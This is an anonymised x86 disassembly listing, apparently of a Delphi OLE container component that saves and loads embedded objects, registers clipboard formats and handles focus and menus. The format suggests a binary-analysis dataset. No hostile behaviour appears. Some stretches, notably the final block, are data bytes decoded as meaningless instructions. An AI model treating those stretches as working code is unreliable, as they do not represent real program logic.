mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x80004002
push r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_403324
test al al
je r-xdata
cmp [ ebx + 0x251 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
xor eax eax
mov [ ebp - 0x4 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub_46e3f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46e484
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebx + 0x21c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e48b
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x21c ]
mov ecx sub_46e494
call sub_4058ec
push 0xffffffff
mov eax [ ebx + 0x218 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OleSave
call sub_46b2c4
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_4058a8
push 0x0
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_46b2c4
mov [ ebx + 0x25b ] 0x0
sub_46e494
or al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e62d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d684
cmp [ ebx + 0x25b ] 0x0
je r-xdata
cmp [ ebx + 0x255 ] 0x0
je r-xdata
push ebx
call sub_46e3f4
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x214 ]
push eax
call GetHGlobalFromILockBytes
call sub_46b2c4
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push 0xffffffff
push 0x0
call CreateILockBytesOnHGlobal
call sub_46b2c4
lea eax [ ebp - 0x8 ]
call sub_4058a8
push eax
push 0x0
push 0x1012
mov eax [ ebp - 0x4 ]
push eax
call StgCreateDocfileOnILockBytes
call sub_46b2c4
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
call sub_46b2c4
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_46b2c4
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetHGlobalFromILockBytes
call sub_46b2c4
jmp r-xdata
mov [ ebp - 0x18 ] 0x434f4442
mov eax [ ebx + 0x220 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_446104
mov ax [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ax
mov ax [ ebp - 0x24 ]
mov [ ebp - 0x16 ] ax
mov ax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0x1c ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
cmp [ ebx + 0x256 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call GlobalSize
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0xc
mov eax esi
call sub_41abcc
mov eax [ ebp - 0xc ]
push eax
call GlobalLock
xor edx edx
push ebp
push sub_46e608
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax esi
call sub_41abcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e60f
mov eax [ ebp - 0xc ]
push eax
call GlobalUnlock
retn
sub_46e660
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x6c ]
mov edx [ r-xdata ]
call sub_404954
xor eax eax
push ebp
push sub_46e899
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x220 ] 0x1
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x220 ] 0x4
mov edi 0x1
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x21c ]
mov ecx r-xdata
call sub_4058ec
cmp ebx esi
je r-xdata
cmp esi 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x220 ]
cmp ebx esi
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x4
jne r-xdata
lea eax [ ebp - 0x14 ]
call sub_4058a8
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_46b2c4
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e8a0
lea eax [ ebp - 0x6c ]
mov edx [ r-xdata ]
call sub_404a18
lea eax [ ebp - 0x14 ]
call sub_4058a8
lea eax [ ebp - 0x10 ]
call sub_4058a8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x30 ]
xor ecx ecx
mov edx 0x14
call sub_402c84
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
push edi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_46b2c4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46ea78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46ece4
mov eax [ ebp - 0x4 ]
call sub_46eb24
xor eax eax
push ebp
push sub_46e84a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x30 ] 0x3
xor eax eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
mov [ ebp - 0x24 ] 0xffffffff
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x3c ] 0x20
mov eax [ ebp - 0xc ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
call sub_46b2c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_46cd68
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
call sub_46b2c4
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
push eax
call OleGetIconOfClass
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x6c ]
mov edx [ r-xdata ]
call sub_404a18
push eax
push 0x1
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp ebx [ ebp - 0x64 ]
jne r-xdata
mov eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
sub_46e8b8
push ebx
add esp 0xfffffff0
mov ebx eax
cmp dl [ ebx + 0x25c ]
je r-xdata
add esp 0x10
pop ebx
retn
mov [ ebx + 0x25c ] dl
push 0x0
push 0x0
mov eax ebx
call sub_44d054
push eax
call GetUpdateRect
test eax eax
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
call sub_46da14
neg eax
push eax
mov eax ebx
call sub_46da14
neg eax
push eax
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov edx esp
mov eax [ ebx + 0x208 ]
call sub_424748
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_46e924
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46da44
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_46d684
xor ecx ecx
mov edx ebx
mov eax esi
call sub_46e660
sub_46e970
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403738
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x259 ] bl
mov eax [ ebp - 0x4 ]
call sub_45e10c
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ esi + 0x27c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
mov eax [ esi + 0x220 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor eax eax
mov [ esi + 0x27c ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x27c ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x262 ] 0x0
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d794
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SetFocus
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44790c
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_46ea78
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46eb06
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ esi + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eb0d
lea eax [ ebp - 0x8 ]
call sub_4058a8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
test bl bl
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a8
lea eax [ ebp - 0x8 ]
mov edx esi
test edx edx
je r-xdata
call sub_4058c0
jmp r-xdata
sub edx 0xfffffd70
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x220 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_46eb24
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x21c ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
call sub_46b2c4
mov eax ebx
mov si 0xffb3
call sub_40346c
sub_46eb50
push ebx
add esp 0xffffffd0
mov ebx eax
cmp [ ebx + 0x284 ] 0x0
je r-xdata
lea edx [ esp + 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ esp + 0x28 ]
mov ecx esp
mov eax [ ebx + 0x30 ]
call sub_4462a8
mov eax ebx
call sub_4461ac
add eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov eax ebx
call sub_446168
mov ecx eax
add ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
call sub_416f14
cmp [ ebx + 0x23c ] 0x0
je r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
add esp 0x30
pop ebx
retn
push 0x3fff
lea eax [ esp + 0x1c ]
push eax
mov ecx 0x3fff
mov edx 0xffffc000
mov eax 0xffffc000
call sub_416f14
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x23c ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
lea edx [ esp + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x18 ]
push eax
mov eax [ ebx + 0x280 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
jmp r-xdata
sub_46ec10
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
lea esi [ ebp - 0x18 ]
xor eax eax
push ebp
push sub_46ecd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d684
mov eax ebx
call sub_46d900
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x22c ] eax
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ecdc
lea eax [ ebp - 0x1c ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
jmp r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jl r-xdata
test [ esi + 0xc ] 0x2
jne r-xdata
mov ax [ esi ]
mov [ ebp - 0x8 ] ax
mov ax [ esi + 0x8 ]
mov [ ebp - 0x6 ] ax
lea eax [ ebp - 0x1c ]
mov edx [ esi + 0x4 ]
call sub_404210
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x22c ]
mov edi [ eax ]
call [ edi + 0x3c ]
sub_46ece4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46ed67
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_415654
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffb3
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ed6e
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
lea eax [ ebx + 0x224 ]
push eax
push 0x0
push 0xffffffff
mov eax [ ebx + 0x220 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax ebx
call sub_46d630
sub_46ed73
add [ edi ] ah
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c66c
pop esi
pop ebx
retn
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax ebx
call sub_46d630
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46edb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x234 ]
mov edx [ eax ]
call [ edx + 0x48 ]
call sub_46ced4
test al al
je r-xdata
mov eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x238 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebx + 0x238 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_46ee14
push ebx
mov ebx eax
mov eax ebx
call sub_45e10c
cmp ebx [ eax + 0x27c ]
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax [ ebx + 0x23c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_46ee58
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_44b788
cmp [ ebx + 0x259 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_46e8b8
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x23c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp ]
push eax
call SetFocus
pop edx
pop ebx
retn
sub_46ee98
push ebx
mov ebx eax
mov eax ebx
call sub_44b640
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp [ ebx + 0x284 ] 0x0
je r-xdata
cmp [ ebx + 0x27a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x259 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
pop ebx
retn
sub_46eedc
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_446104
mov edx esi
mov eax ebx
call sub_44b530
cmp [ ebx + 0x259 ] 0x0
je r-xdata
add esp 0x20
pop esi
pop ebx
retn
push esp
lea edx [ esp + 0x14 ]
mov eax ebx
call sub_446104
lea eax [ esp + 0x14 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov eax ebx
call sub_46eb50
sub_46ef28
push ebx
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418550
call sub_46d7bc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_46efe8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp + 0xc ]
push esi
lea esi [ ebp - 0x18 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esi + 0xc ]
call sub_449d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_46f4e0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0xc ]
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_46f4f4
test al al
jne r-xdata
mov al [ ebx + 0x5b ]
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x4c ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x4c ]
sub [ eax + 0xc ] edx
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x48 ]
add [ eax ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x48 ]
sub [ eax + 0x8 ] edx
jmp r-xdata
jmp r-xdata
sub_46f0a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
call sub_449d84
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x22f ] 0x2
je r-xdata
mov [ ebp - 0x4 ] 0x800401a1
inc eax
mov ebx eax
xor edi edi
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc edi
dec ebx
jne r-xdata
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ esi + 0xc ]
mov edx edi
call sub_449d48
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_46f114
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
push esi
call sub_46f0a8
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
call sub_4498ec
mov eax [ esi + 0xc ]
call sub_449d84
dec eax
test eax eax
jl r-xdata
xor ebx ebx
mov eax rw-data
mov [ ebp - 0xc ] eax
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
inc ebx
inc [ ebp - 0xc ]
cmp ebx 0x4
jne r-xdata
mov edi [ esi + ebx * 4 + 0x24 ]
test edi edi
jne r-xdata
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_446684
mov edx edi
mov eax [ esi + 0x20 ]
call sub_4183f4
mov eax [ ebp + 0xc ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4498f4
xor eax eax
test bl 0x1
je r-xdata
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_445864
mov edi eax
cmp ebx 0x2
jge r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_449d48
mov edi eax
mov edx edi
mov eax esi
call sub_46f4f4
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_445f20
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_445f44
jmp r-xdata
mov eax 0xffffd8f0
mov eax 0x2710
jmp r-xdata
mov edx eax
mov eax edi
call sub_445ed4
mov edx eax
mov eax edi
call sub_445ef8
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ ebp - 0xc ]
mov dl [ eax ]
mov eax edi
call sub_445c78
mov edx [ esi + 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ esi + ebx * 4 + 0x24 ] edi
sub_46f340
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
jmp r-xdata
push ebx
call GetMenuItemCount
test eax eax
jg r-xdata
push 0x400
push 0x0
push ebx
call RemoveMenu
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_46f394
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
mov eax 0x1
mov dx [ ebp + 0x10 ]
mov eax ebx
call sub_459b4c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_46f3c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov [ edi + 0xc ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ edi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ edi + 0x20 ] eax
mov eax [ edi + 0xc ]
add eax 0x264
mov edx edi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035bc
call sub_4058c0
mov eax edi
test bl bl
je r-xdata
sub edx 0xffffffc8
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_46f438
push ebx
push esi
push edi
call sub_403624
mov ebx edx
mov edi eax
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax [ edi + 0x20 ]
call sub_403270
mov eax [ edi + 0x10 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403260
test bl bl
jle r-xdata
lea eax [ esi + 0x264 ]
call sub_4058a8
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
sub_46f484
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0xc ]
call sub_4498ec
xor ebx ebx
mov eax [ esi + ebx * 4 + 0x24 ]
call sub_403270
xor eax eax
mov [ esi + ebx * 4 + 0x24 ] eax
inc ebx
cmp ebx 0x4
jne r-xdata
mov eax [ esi + 0x20 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x20 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0xc ]
call sub_4498f4
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_418550
mov dl 0x1
call sub_446684
inc ebx
dec edi
jne r-xdata
sub_46f4f4
push ebx
mov ebx edx
cmp [ ebx + 0x57 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x5b ]
dec eax
sub al 0x4
jae r-xdata
push 0x0
xor ecx ecx
mov edx 0xb032
mov eax ebx
call sub_44790c
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_46f540
push ebx
push esi
mov esi rw-data
push 0x0
call GetDC
mov ebx eax
push 0x58
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] eax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] eax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] eax
mov ax [ rw-data ]
mov [ esi ] ax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] 0xffffffff
mov [ esi + 0x10 ] 0x8
mov ax [ rw-data ]
mov [ esi + 0x14 ] ax
mov [ esi + 0x1c ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x24 ] 0x1
pop esi
pop ebx
retn
sub_46f610
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f63c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f643
retn
call OleUninitialize
sub_46f6f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f715
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f71c
retn
sub_46f842
out dx al
inc eax
adc eax [ edi ]
loopne r-xdata
clc
inc esi
add [ edi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
inc edi
add [ esi ] cl
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
test [ esi ] r-xdata
or [ eax ] eax
push es
inc esp
dec ebp
popad
outsb
pop es
add [ eax + edx + 0xc00040 ] ch
add bh bh
rol [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53120002 ] al
jb r-xdata
xor [ ecx + eax * 2 + 0x470af000 ] cl
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax + 0xb ] al
inc edi
add [ eax ] al
adc al 0x47
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
push 0xe00470a
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
rol [ eax ] 0x0
add [ edx ] al
add bh ch
pushad
arpl [ ebp + ecx * 2 + 0x6f ] si
imul esp [ ebx + 0x65 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
lodsb [ esi ]
adc [ eax ] al
xor [ eax ] al
add bh bh
nop
adc eax [ edi ]
